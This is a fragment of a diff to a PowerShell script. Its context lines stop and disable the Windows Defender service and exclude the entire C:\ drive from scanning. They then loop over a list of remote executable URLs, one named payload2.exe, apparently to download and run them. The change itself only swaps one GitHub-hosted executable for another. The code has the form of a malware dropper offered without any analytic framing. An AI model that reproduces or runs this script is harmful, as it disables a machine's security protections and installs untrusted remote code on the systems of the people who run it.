@@ -9,7 +9,7 @@ Stop-Service -Name WinDefend -Force
 Set-Service -Name WinDefend -StartupType Disabled
 Add-MpPreference -ExclusionPath "C:\" -Force
 $urls = @(
-    "https://github.com/sys1e/cmd/raw/refs/heads/main/bll.exe",
+    "https://github.com/sys1e/cmd/raw/refs/heads/main/Client.exe",
     "https://github.com/example/repo/raw/main/payload2.exe"
 )
 foreach ($url in $urls) {
